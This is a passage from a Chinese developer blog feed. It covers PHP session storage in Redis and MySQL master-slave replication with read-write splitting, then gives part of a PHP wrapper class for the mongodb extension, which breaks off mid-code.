<p>php在进行session操作的时候会生成一个session id，而后把这个值以cookie的形式保存在客户端，就是图示中的PHPSESSID了。客户端在下次请求的时候就会带上这个PHPSESSID，服务端就能知道当前客户端对应的session文件了。</p>
<h3 id="session超时设置"><a href="#session超时设置" class="headerlink" title="session超时设置"></a>session超时设置</h3><p>cookie超时设置比较简单，一个参数就搞定了。session这边有点小麻烦，既不能单独设置cookie PHPSESSID的超时时间，也不能单独设置服务端文件的超时时间。具体的可以参考鸟哥这篇文章：如何设置一个严格30分钟过期的Session，真的非常严谨，赞一下。</p>
<h3 id="session服务器共享"><a href="#session服务器共享" class="headerlink" title="session服务器共享"></a>session服务器共享</h3><p>这个问题和cookie的跨域类似，面试的时候也很爱聊这个问题。 以前在做服务器集群的时候会碰到这样的一样问题，就是用户一会访问是处于正常登录状态，一会访问又没有登录了。这个问题偶尔才会出现。跟踪代码下去才发现session没有取到相应的值，想想也是醉了：原来服务器session没有设置共享，session存在在本地文件目录，当用户访问另外一台服务器的时候自然就取不到session了。 解决方法也不难，通过共享的存储在进行服务器之间的共享。这里使用redis的进行session存储。可以通过php.ini配置文件进行调整，也可以在代码中通过ini_set进行调整</p>
<p>ini_set(“session.save_handler”, “redis”);<br>ini_set(“session.save_path”, “tcp://127.0.0.1:6379”);</p>
<p>如果需要使用redis进行存储，需要session中的Registered save handlers支持redis</p>
<p><img src="http://7xnd02.com1.z0.glb.clouddn.com/VRFNfyQ.png">       </p>
<p>php中session是否支持redis</p>
<p>当这样设置之后，session就会保存在redis中了，不同的集群服务器之间就可以通过该redis服务器进行共享了。 好吧，暂时就写到这里了，以后会发现新的坑会继续补充上来。</p>
]]></content>
      <categories>
        <category>WEB技术</category>
      </categories>
      <tags>
        <tag>WEB技术</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL主从复制与读写分离介绍及原理</title>
    <url>/2017/02/13/mysql-%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E4%B8%8E%E8%AF%BB%E5%86%99%E5%88%86%E7%A6%BB%E6%A6%82%E5%BF%B5%E5%8F%8A%E6%9E%B6%E6%9E%84%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p><strong>1.MySQL主从复制入门</strong><br>首先，我们看一个图：   <img src="http://images2015.cnblogs.com/blog/983304/201606/983304-20160626203233156-1887991281.jpg">   影响MySQL-A数据库的操作，在数据库执行后，都会写入本地的日志系统A中</p>
<p>假设，实时的将变化了的日志系统中的数据库事件操作，在MYSQL-A的3306端口，通过网络发给MYSQL-B。   MYSQL-B收到后，写入本地日志系统B，然后一条条的将数据库事件在数据库中完成。   那么，MYSQL-A的变化，MYSQL-B也会变化，这样就是所谓的MYSQL的复制，即MYSQL replication。   在上面的模型中，MYSQL-A就是主服务器，即master，MYSQL-B就是从服务器，即slave。   日志系统A，其实它是MYSQL的日志类型中的二进制日志，也就是专门用来保存修改数据库表的所有动作，即bin log。【注意MYSQL会在执行语句之后，释放锁之前，写入二进制日志，确保事务安全】   日志系统B，并不是二进制日志，由于它是从MYSQL-A的二进制日志复制过来的，并不是自己的数据库变化产生的，有点接力的感觉，称为中继日志，即relay log。   可以发现，通过上面的机制，可以保证MYSQL-A和MYSQL-B的数据库数据一致，但是时间上肯定有延迟，即MYSQL-B的数据是滞后的。 【即便不考虑什么网络的因素，MYSQL-A的数据库操作是可以并发的执行的，但是MYSQL-B只能从relay log中读一条，执行下。因此MYSQL-A的写操作很频繁，MYSQL-B很可能跟不上。】    </p>
<p>  <strong>2.主从复制的几种方式</strong>  </p>
<p>同步复制 所谓的同步复制，意思是master的变化，必须等待slave-1,slave-2,…,slave-n完成后才能返回。 这样，显然不可取，也不是MYSQL复制的默认设置。比如，在WEB前端页面上，用户增加了条记录，需要等待很长时间。   异步复制 如同AJAX请求一样。master只需要完成自己的数据库操作即可。至于slaves是否收到二进制日志，是否完成操作，不用关心。MYSQL的默认设置。   半同步复制 master只保证slaves中的一个操作成功，就返回，其他slave不管。 这个功能，是由google为MYSQL引入的。    </p>
<p>  <strong>3.主从复制分析</strong>   问题1：master的写操作，slaves被动的进行一样的操作，保持数据一致性，那么slave是否可以主动的进行写操作？   假设slave可以主动的进行写操作，slave又无法通知master，这样就导致了master和slave数据不一致了。因此slave不应该进行写操作，至少是slave上涉及到复制的数据库不可以写。实际上，这里已经揭示了读写分离的概念。   问题2：主从复制中，可以有N个slave,可是这些slave又不能进行写操作，要他们干嘛？   可以实现数据备份。 类似于高可用的功能，一旦master挂了，可以让slave顶上去，同时slave提升为master。 异地容灾，比如master在北京，地震挂了，那么在上海的slave还可以继续。 主要用于实现scale out,分担负载,可以将读的任务分散到slaves上。 【很可能的情况是，一个系统的读操作远远多于写操作，因此写操作发向master，读操作发向slaves进行操作】   问题3：主从复制中有master,slave1,slave2,…等等这么多MYSQL数据库，那比如一个JAVA WEB应用到底应该连接哪个数据库?   当 然，我们在应用程序中可以这样，insert/delete/update这些更新数据库的操作，用connection(for master)进行操作，select用connection(for slaves)进行操作。那我们的应用程序还要完成怎么从slaves选择一个来执行select，例如简单的轮循算法。 这样的话，相当于应用程序完成了SQL语句的路由，而且与MYSQL的主从复制架构非常关联，一旦master挂了，某些slave挂了，那么应用程序就要修改了。能不能让应用程序与MYSQL的主从复制架构没有什么太多关系呢？可以看下面的图： <img src="http://static.open-open.com/lib/uploadImg/20141014/20141014162019_695.jpg?_=5618522">   找一个组件，application program只需要与它打交道，用它来完成MYSQL的代理，实现SQL语句的路由。   mysql proxy并不负责，怎么从众多的slaves挑一个？可以交给另一个组件(比如haproxy)来完成。   这就是所谓的MYSQL READ WRITE SPLITE，MYSQL的读写分离。   问题4：如果mysql proxy , direct , master他们中的某些挂了怎么办？   总统一般都会弄个副总统，以防不测。同样的，可以给这些关键的节点来个备份。   问题5：当master的二进制日志每产生一个事件，都需要发往slave，如果我们有N个slave,那是发N次，还是只发一次？   如果只发一次，发给了slave-1，那slave-2,slave-3,…它们怎么办？ 显 然，应该发N次。实际上，在MYSQL master内部，维护N个线程，每一个线程负责将二进制日志文件发往对应的slave。master既要负责写操作，还的维护N个线程，负担会很重。可 以这样，slave-1是master的从，slave-1又是slave-2,slave-3,…的主，同时slave-1不再负责select。 slave-1将master的复制线程的负担，转移到自己的身上。这就是所谓的多级复制的概念。   问题6：当一个select发往mysql proxy，可能这次由slave-2响应，下次由slave-3响应，这样的话，就无法利用查询缓存了。   应该找一个共享式的缓存，比如memcache来解决。将slave-2,slave-3,…这些查询的结果都缓存至mamcache中。</p>
]]></content>
      <categories>
        <category>MySQL</category>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP封装mongdb扩展类(不是mongo)</title>
    <url>/2017/02/13/php%E5%B0%81%E8%A3%85mongdb%E6%89%A9%E5%B1%95%E7%B1%BB%E4%B8%8D%E6%98%AFmongo/</url>
    <content><![CDATA[<p>在应用PHP7时发现原来的mongo扩展已经被废弃，而是采用了新的mongodb扩展，这个扩展对应封装的方法包含三十多个类，具体区别见官方手册<a href="http://php.net/">php.net</a>搜索mongo和mongodb， 原来应用对mongo的各种操作都不能用了，折腾了好几天，不停地翻阅手册，终于重新封装了一个mongodb扩展的类，可能还有不足欢迎指出！  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> * Created by PhpStorm.</span><br><span class="line"> * User: fengqiang</span><br><span class="line"> * Date: 2016&#x2F;12&#x2F;1</span><br><span class="line"> * Time: 18:30</span><br><span class="line"> *&#x2F;</span><br><span class="line">class mongodbdo</span><br><span class="line">&#123;</span><br><span class="line">    private $config;</span><br><span class="line">    private $host;</span><br><span class="line">    private $port &#x3D; 27017;</span><br><span class="line">    private $database;</span><br><span class="line">    private $username;</span><br><span class="line">    private $password;</span><br><span class="line">    private $debug &#x3D; false;</span><br><span class="line"></span><br><span class="line">    private $collection &#x3D; &#39;&#39;;</span><br><span class="line">    private $selects;</span><br><span class="line">    private $wheres;</span><br><span class="line">    private $updates;</span><br><span class="line">    private $limit &#x3D; 9999999;</span><br><span class="line">    private $offset &#x3D; 0;</span><br><span class="line">    private $sorts;</span><br><span class="line"></span><br><span class="line">    private $manager;</span><br><span class="line">    private $result;</span><br><span class="line"></span><br><span class="line">    public function __construct($config)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;config &#x3D; $config;</span><br><span class="line">        $this-&gt;connect();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;**</span><br><span class="line">     * 预处理</span><br><span class="line">     *&#x2F;</span><br><span class="line">    private function prepareConfig()</span><br><span class="line">    &#123;</span><br><span class="line">        if (isset($this-&gt;config\[&#39;host&#39;\])) &#123;</span><br><span class="line">            $this-&gt;host &#x3D; trim($this-&gt;config\[&#39;host&#39;\]);</span><br><span class="line">        &#125;</span><br><span class="line">        if (isset($this-&gt;config\[&#39;port&#39;\])) &#123;</span><br><span class="line">            $this-&gt;port &#x3D; trim($this-&gt;config\[&#39;port&#39;\]);</span><br><span class="line">        &#125;</span><br><span class="line">        if (isset($this-&gt;config\[&#39;username&#39;\])) &#123;</span><br><span class="line">            $this-&gt;username &#x3D; trim($this-&gt;config\[&#39;username&#39;\]);</span><br><span class="line">        &#125;</span><br><span class="line">        if (isset($this-&gt;config\[&#39;password&#39;\])) &#123;</span><br><span class="line">            $this-&gt;password &#x3D; trim($this-&gt;config\[&#39;password&#39;\]);</span><br><span class="line">        &#125;</span><br><span class="line">        if (isset($this-&gt;config\[&#39;dbname&#39;\])) &#123;</span><br><span class="line">            $this-&gt;database &#x3D; trim($this-&gt;config\[&#39;dbname&#39;\]);</span><br><span class="line">        &#125;</span><br><span class="line">        if (isset($this-&gt;config\[&#39;db_debug&#39;\])) &#123;</span><br><span class="line">            $this-&gt;debug &#x3D; $this-&gt;config\[&#39;db_debug&#39;\];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;**</span><br><span class="line">     * 链接</span><br><span class="line">     *&#x2F;</span><br><span class="line">    private function connect()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;prepareConfig();</span><br><span class="line">        try &#123;</span><br><span class="line">            $dsn &#x3D; &quot;mongodb:&#x2F;&#x2F;&#123;$this-&gt;host&#125;:&#123;$this-&gt;port&#125;&#x2F;&#123;$this-&gt;database&#125;&quot;;</span><br><span class="line">            &#x2F;*$options &#x3D; array(</span><br><span class="line">                &#39;username&#39; &#x3D;&gt; $this-&gt;username,</span><br><span class="line">                &#39;password&#39; &#x3D;&gt; $this-&gt;password</span><br><span class="line">            );*&#x2F;</span><br><span class="line">            $options &#x3D; array(&#39;connect&#39; &#x3D;&gt; true,  &quot;socketTimeoutMS&quot; &#x3D;&gt; 28800000000);</span><br><span class="line">            $this-&gt;manager &#x3D; new MongoDB\\Driver\\Manager($dsn, $options);</span><br><span class="line"></span><br><span class="line">        &#125; catch (\\Exception $e) &#123;</span><br><span class="line">            $this-&gt;showError($e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;**</span><br><span class="line">     * 获取当前连接</span><br><span class="line">     * @return mixed</span><br><span class="line">     *&#x2F;</span><br><span class="line">    public function getManager()</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;manager;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#x2F;**</span><br><span class="line">     * @param mixed $collection</span><br><span class="line">     *&#x2F;</span><br><span class="line">    public function getCollection()</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;collection;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;**</span><br><span class="line">     * 获取查询所需胡字段</span><br><span class="line">     * @return array</span><br><span class="line">     *&#x2F;</span><br><span class="line">    public function getSelects()</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;selects;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;**</span><br><span class="line">     * 获取条件</span><br><span class="line">     * @return array</span><br><span class="line">     *&#x2F;</span><br><span class="line">    public function getWheres()</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;wheres;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;**</span><br><span class="line">     * 获取更新内容</span><br><span class="line">     * @return array</span><br><span class="line">     *&#x2F;</span><br><span class="line">    public function getUpdates()</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;updates;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;**</span><br><span class="line">     * 获取条数</span><br><span class="line">     * @return int</span><br><span class="line">     *&#x2F;</span><br><span class="line">    public function getLimit()</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;limit;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;**</span><br><span class="line">     * 获取偏移量</span><br><span class="line">     * @return int</span><br><span class="line">     *&#x2F;</span><br><span class="line">    public function getOffset()</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;offset;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;**</span><br><span class="line">     * 获取排序</span><br><span class="line">     * @return array</span><br><span class="line">     *&#x2F;</span><br><span class="line">    public function getSorts()</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;sorts;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;**</span><br><span class="line">     * @param mixed $collection</span><br><span class="line">     *&#x2F;</span><br><span class="line">    public function setCollection( $collection)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;collection &#x3D; $collection;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;**</span><br><span class="line">     * @param array $selects</span><br><span class="line">     *&#x2F;</span><br><span class="line">    public function setSelects(array $selects)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;selects &#x3D; $selects;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;**</span><br><span class="line">     * @param array $wheres</span><br><span class="line">     *&#x2F;</span><br><span class="line">    public function setWheres(array $wheres)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;wheres &#x3D; $wheres;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;**</span><br><span class="line">     * @param array $updates</span><br><span class="line">     *&#x2F;</span><br><span class="line">    public function setUpdates(array $updates)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;updates &#x3D; $updates;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;**</span><br><span class="line">     * @param int $limit</span><br><span class="line">     *&#x2F;</span><br><span class="line">    public function setLimit( $limit)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;limit &#x3D; $limit;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;**</span><br><span class="line">     * @param int $offset</span><br><span class="line">     *&#x2F;</span><br><span class="line">    public function setOffset( $offset)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;offset &#x3D; $offset;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;**</span><br><span class="line">     * @param array $sorts</span><br><span class="line">     *&#x2F;</span><br><span class="line">    public function setSorts(array $sorts)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;sorts &#x3D; $sorts;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#x2F;**</span><br><span class="line">     * @param $database</span><br><span class="line">     * @return $this</span><br><span class="line">     *&#x2F;</span><br><span class="line">    public function switch_db($database)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;database &#x3D; $database;</span><br><span class="line">        return $this;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;**</span><br><span class="line">     * @param $table</span><br><span class="line">     * @return $this</span><br><span class="line">     *&#x2F;</span><br><span class="line">    public function collection($collection)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;collection &#x3D; $collection;</span><br><span class="line">        return $this;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;**</span><br><span class="line">     * @param $collection</span><br><span class="line">     * @return Mongo_db</span><br><span class="line">     *&#x2F;</span><br><span class="line">    public function table($collection)</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;collection($collection);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;**</span><br><span class="line">     * 增</span><br><span class="line">     * @param array $document</span><br><span class="line">     * @param string $wstring</span><br><span class="line">     * @param int $wtimeout</span><br><span class="line">     * @return mixed</span><br><span class="line">     *&#x2F;</span><br><span class="line">    public function insert(</span><br><span class="line">        $document &#x3D; array(),</span><br><span class="line">        $wstring &#x3D; \\MongoDB\\Driver\\WriteConcern::MAJORITY,</span><br><span class="line">        $wtimeout &#x3D; 1000)</span><br><span class="line">    &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            $wc &#x3D; new \\MongoDB\\Driver\\WriteConcern($wstring, $wtimeout);</span><br><span class="line">            $bulk &#x3D; new \\MongoDB\\Driver\\BulkWrite();</span><br><span class="line">            $bulk-&gt;insert($document);</span><br><span class="line">            $dbc &#x3D; $this-&gt;database . &#39;.&#39; . $this-&gt;collection;</span><br><span class="line">            $result &#x3D; $this-&gt;manager-&gt;executeBulkWrite($dbc, $bulk, $wc);</span><br><span class="line">            $this-&gt;result &#x3D; $result;</span><br><span class="line">            &#x2F;&#x2F;增加几条</span><br><span class="line">            return $result-&gt;getInsertedCount();</span><br><span class="line">        &#125; catch (\\Exception $e) &#123;</span><br><span class="line">            $this-&gt;showError($e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;**</span><br><span class="line">     * 批量添加</span><br><span class="line">     * @param array $documents</span><br><span class="line">     * @param string $wstring</span><br><span class="line">     * @param int $wtimeout</span><br><span class="line">     * @return mixed</span><br><span class="line">     *&#x2F;</span><br><span class="line">    public function batch_insert(</span><br><span class="line">        $documents &#x3D; array(),</span><br><span class="line">        $wstring &#x3D; \\MongoDB\\Driver\\WriteConcern::MAJORITY,</span><br><span class="line">        $wtimeout &#x3D; 1000)</span><br><span class="line">    &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            $wc &#x3D; new \\MongoDB\\Driver\\WriteConcern($wstring, $wtimeout);</span><br><span class="line">            $bulk &#x3D; new \\MongoDB\\Driver\\BulkWrite();</span><br><span class="line">            foreach ($documents as $k &#x3D;&gt; $document) &#123;</span><br><span class="line">                $bulk-&gt;insert($document);</span><br><span class="line">            &#125;</span><br><span class="line">            $dbc &#x3D; $this-&gt;database . &#39;.&#39; . $this-&gt;collection;</span><br><span class="line">            $result &#x3D; $this-&gt;manager-&gt;executeBulkWrite($dbc, $bulk, $wc);</span><br><span class="line">            $this-&gt;result &#x3D; $result;</span><br><span class="line">            &#x2F;&#x2F;增加几条</span><br><span class="line">            return $result-&gt;getInsertedCount();</span><br><span class="line">        &#125; catch (\\Exception $e) &#123;</span><br><span class="line">            $this-&gt;showError($e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;**</span><br><span class="line">     * 删</span><br><span class="line">     * @param array $deleteOptions</span><br><span class="line">     * @param string $wstring</span><br><span class="line">     * @param int $wtimeout</span><br><span class="line">     * @return mixed</span><br><span class="line">     *&#x2F;</span><br><span class="line">    public function delete(</span><br><span class="line">        $deleteOptions &#x3D; \[&quot;limit&quot; &#x3D;&gt; 1\],</span><br><span class="line">        $wstring &#x3D; \\MongoDB\\Driver\\WriteConcern::MAJORITY,</span><br><span class="line">        $wtimeout &#x3D; 1000</span><br><span class="line">    )</span><br><span class="line">    &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            $wc &#x3D; new \\MongoDB\\Driver\\WriteConcern($wstring, $wtimeout);</span><br><span class="line">            $bulk &#x3D; new \\MongoDB\\Driver\\BulkWrite();</span><br><span class="line">            $filter &#x3D; $this-&gt;wheres;</span><br><span class="line">            if (count($filter) &lt; 1 &amp;&amp; $deleteOptions\[&#39;limit&#39;\] &#x3D;&#x3D; 1) &#123;</span><br><span class="line">                throw new \\Exception(&#39;filter is error!&#39;);</span><br><span class="line">            &#125;</span><br><span class="line">            $bulk-&gt;delete($filter, $deleteOptions);</span><br><span class="line">            $dbc &#x3D; $this-&gt;database . &#39;.&#39; . $this-&gt;collection;</span><br><span class="line">            $result &#x3D; $this-&gt;manager-&gt;executeBulkWrite($dbc, $bulk, $wc);</span><br><span class="line">            $this-&gt;result &#x3D; $result;</span><br><span class="line">            &#x2F;&#x2F;删除几条</span><br><span class="line">            return $result-&gt;getDeletedCount();</span><br><span class="line">        &#125; catch</span><br><span class="line">        (\\Exception $e) &#123;</span><br><span class="line">            $this-&gt;showError($e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#x2F;**</span><br><span class="line">     * 删除所有</span><br><span class="line">     * @param array $deleteOptions</span><br><span class="line">     * @param string $wstring</span><br><span class="line">     * @param int $wtimeout</span><br><span class="line">     * @return mixed</span><br><span class="line">     *&#x2F;</span><br><span class="line">    public function delete_all(</span><br><span class="line">        $deleteOptions &#x3D; \[&quot;limit&quot; &#x3D;&gt; 0\],</span><br><span class="line">        $wstring &#x3D; \\MongoDB\\Driver\\WriteConcern::MAJORITY,</span><br><span class="line">        $wtimeout &#x3D; 1000</span><br><span class="line">    )</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;delete($deleteOptions, $wstring, $wtimeout);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;**</span><br><span class="line">     * 更新</span><br><span class="line">     * @param array $updateOptions</span><br><span class="line">     * @param string $wstring</span><br><span class="line">     * @param int $wtimeout</span><br><span class="line">     *&#x2F;</span><br><span class="line">    public function update(</span><br><span class="line">        $updateOptions &#x3D; \[&#39;multi&#39; &#x3D;&gt; false, &#39;upsert&#39; &#x3D;&gt; false\],</span><br><span class="line">        $wstring &#x3D; \\MongoDB\\Driver\\WriteConcern::MAJORITY,</span><br><span class="line">        $wtimeout &#x3D; 1000</span><br><span class="line">    )</span><br><span class="line">    &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            $wc &#x3D; new \\MongoDB\\Driver\\WriteConcern($wstring, $wtimeout);</span><br><span class="line">            $bulk &#x3D; new \\MongoDB\\Driver\\BulkWrite();</span><br><span class="line">            $filter &#x3D; $this-&gt;wheres;</span><br><span class="line">            if (count($filter) &lt; 1 &amp;&amp; $updateOptions\[&#39;multi&#39;\] &#x3D;&#x3D; false) &#123;</span><br><span class="line">                throw new \\Exception(&#39;filter is error!&#39;);</span><br><span class="line">            &#125;</span><br><span class="line">            $newObj &#x3D; $this-&gt;updates;</span><br><span class="line">            $bulk-&gt;update(</span><br><span class="line">                $filter,</span><br><span class="line">                $newObj,</span><br><span class="line">                $updateOptions</span><br><span class="line">            );</span><br><span class="line">            $dbc &#x3D; $this-&gt;database . &#39;.&#39; . $this-&gt;collection;</span><br><span class="line">            $result &#x3D; $this-&gt;manager-&gt;executeBulkWrite($dbc, $bulk, $wc);</span><br><span class="line">            $this-&gt;result &#x3D; $result;</span><br><span class="line">            return $result-&gt;getModifiedCount();</span><br><span class="line">        &#125; catch (\\Exception $e) &#123;</span><br><span class="line">            $this-&gt;showError($e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;**</span><br><span class="line">     * 更新所有</span><br><span class="line">     * @param array $updateOptions</span><br><span class="line">     * @param string $wstring</span><br><span class="line">     * @param int $wtimeout</span><br><span class="line">     *&#x2F;</span><br><span class="line">    public function update_all(</span><br><span class="line">        $updateOptions &#x3D; \[&#39;multi&#39; &#x3D;&gt; true, &#39;upsert&#39; &#x3D;&gt; false\],</span><br><span class="line">        $wstring &#x3D; \\MongoDB\\Driver\\WriteConcern::MAJORITY,</span><br><span class="line">        $wtimeout &#x3D; 1000000</span><br><span class="line">    )</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;update($updateOptions, $wstring, $wtimeout);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#x2F;**</span><br><span class="line">     * 查询单条</span><br><span class="line">     * @param null $id</span><br><span class="line">     * @return mixed|null</span><br><span class="line">     *&#x2F;</span><br><span class="line">    public function find($id &#x3D; null)</span><br><span class="line">    &#123;</span><br><span class="line">        if ($id !&#x3D; null) &#123;</span><br><span class="line">            $this-&gt;where(&#39;_id&#39;, new \\MongoDB\\BSON\\ObjectID($id));</span><br><span class="line">        &#125;</span><br><span class="line">        $filter &#x3D; $this-&gt;wheres;</span><br><span class="line">        $options &#x3D; \[</span><br><span class="line">            &#39;projection&#39; &#x3D;&gt; $this-&gt;selects,</span><br><span class="line">            &quot;sort&quot; &#x3D;&gt; $this-&gt;sorts,</span><br><span class="line">            &quot;skip&quot; &#x3D;&gt; 0,</span><br><span class="line">            &quot;limit&quot; &#x3D;&gt; 1,</span><br><span class="line">        \];</span><br><span class="line">        $query &#x3D; new \\MongoDB\\Driver\\Query($filter, $options);</span><br><span class="line">        $dbc &#x3D; $this-&gt;database . &#39;.&#39; . $this-&gt;collection;</span><br><span class="line">        $documents &#x3D; $this-&gt;manager-&gt;executeQuery($dbc, $query);</span><br><span class="line">        $this-&gt;result &#x3D; $documents;</span><br><span class="line">        $returns &#x3D; null;</span><br><span class="line">        foreach ($documents as $document) &#123;</span><br><span class="line">            $bson &#x3D; \\MongoDB\\BSON\\fromPHP($document);</span><br><span class="line">            $returns &#x3D; json_decode(\\MongoDB\\BSON\\toJSON($bson), true);</span><br><span class="line">        &#125;</span><br><span class="line">        return $returns;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    public function findALL($argv &#x3D; array(),$fields &#x3D; array(),$sort &#x3D; array(),$skip &#x3D; 0, $limit &#x3D; 0)</span><br><span class="line">    &#123;</span><br><span class="line">        &#x2F;*$argv &#x3D; $this-&gt;validate($argv);</span><br><span class="line"></span><br><span class="line">        if ($argv) &#123;</span><br><span class="line">            $result &#x3D; $this-&gt;_mongoDB-&gt;find($argv)</span><br><span class="line">            -&gt;skip($skip)</span><br><span class="line">            -&gt;limit($limit)</span><br><span class="line">            -&gt;sort($sort);</span><br><span class="line">            return self::toArray($result);</span><br><span class="line">        &#125;*&#x2F;</span><br><span class="line"></span><br><span class="line">        $options &#x3D; array();</span><br><span class="line"></span><br><span class="line">        if ($skip) &#123;</span><br><span class="line">            $options\[&#39;skip&#39;\] &#x3D; $skip;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if ($limit) &#123;</span><br><span class="line">            $options\[&#39;limit&#39;\] &#x3D; $limit;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if ($sort) &#123;</span><br><span class="line">            $options\[&#39;sort&#39;\] &#x3D; $sort;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if ($fields) &#123;</span><br><span class="line">            if (is_string($fields)) &#123;</span><br><span class="line">                $fields &#x3D; explode(&#39;,&#39;, $fields);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            foreach ($fields as $v) &#123;</span><br><span class="line">                $options\[&#39;projection&#39;\]\[$v\] &#x3D; 1;</span><br><span class="line">            &#125;</span><br><span class="line">            $options\[&#39;projection&#39;\]\[&#39;_id&#39;\] &#x3D; 0;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $query &#x3D; new \\MongoDB\\Driver\\Query($argv, $options);</span><br><span class="line"></span><br><span class="line">        $cursor &#x3D; $this-&gt;manager-&gt;executeQuery($this-&gt;database.&#39;.&#39;.$this-&gt;collection, $query);</span><br><span class="line"></span><br><span class="line">        return $cursor-&gt;toArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;**</span><br><span class="line">     * command</span><br><span class="line">     * @param $db</span><br><span class="line">     * @param $commands</span><br><span class="line">     * @return mixed</span><br><span class="line">     *&#x2F;</span><br><span class="line">    public function command($db, $commands)</span><br><span class="line">    &#123;</span><br><span class="line">        $db &#x3D; $db?$db:$this-&gt;database;</span><br><span class="line">        try &#123;</span><br><span class="line">            if(is_array($commands))</span><br><span class="line">            &#123;</span><br><span class="line">               $commands &#x3D; new \\MongoDB\\Driver\\Command($commands);</span><br><span class="line">            &#125;</span><br><span class="line">            $cursor &#x3D; $this-&gt;manager-&gt;executeCommand($db, $commands);</span><br><span class="line">            $this-&gt;result &#x3D; $cursor;</span><br><span class="line">            return $cursor;</span><br><span class="line">        &#125; catch (\\Exception $e) &#123;</span><br><span class="line">            $this-&gt;showError($e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function dropDatabase()</span><br><span class="line">    &#123;</span><br><span class="line">        $cmd &#x3D; array(</span><br><span class="line">            &#39;dropDatabase&#39; &#x3D;&gt; 1,</span><br><span class="line">        );</span><br><span class="line">        $db &#x3D; $this-&gt;database;</span><br><span class="line">        $commands &#x3D; new \\MongoDB\\Driver\\Command($cmd);</span><br><span class="line">        $cursor &#x3D; $this-&gt;command($db, $commands);</span><br><span class="line">        $this-&gt;result &#x3D; $cursor;</span><br><span class="line">        $response &#x3D; current($cursor-&gt;toArray());</span><br><span class="line">        return $response;</span><br><span class="line">    &#125;</span><br><span 